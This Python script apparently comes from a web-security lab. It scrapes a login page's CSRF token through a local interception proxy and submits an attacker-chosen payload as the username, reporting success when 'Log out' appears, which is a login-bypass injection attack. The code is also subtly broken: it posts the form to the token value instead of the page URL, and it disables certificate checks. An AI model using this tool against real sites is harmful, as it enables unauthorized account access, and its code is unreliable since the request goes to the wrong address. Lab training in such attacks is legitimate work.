import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def csrfToken(session, url):
    request = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(request.text, 'html.parser')
    inp = soup.find("input")
    if not inp or 'value' not in inp.attrs:
        print("[-] error: csrf input not found")
        return None
    csrf = inp['value']
    return csrf

def exploit(session, url, payload):
    csrf = csrfToken(session, url)
    data = {"csrf": csrf, "username": payload, "password": ""}
    request = session.post(csrf, data=data, verify=False, proxies=proxies)
    if "Log out" in request.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[!] syntax-error: {sys.argv[0]} <url> <payload>")
        sys.exit()
    session = requests.Session()
    if exploit(session, url, payload):
        print("[+] status: success")
    else:
        print("[-] status: failure")
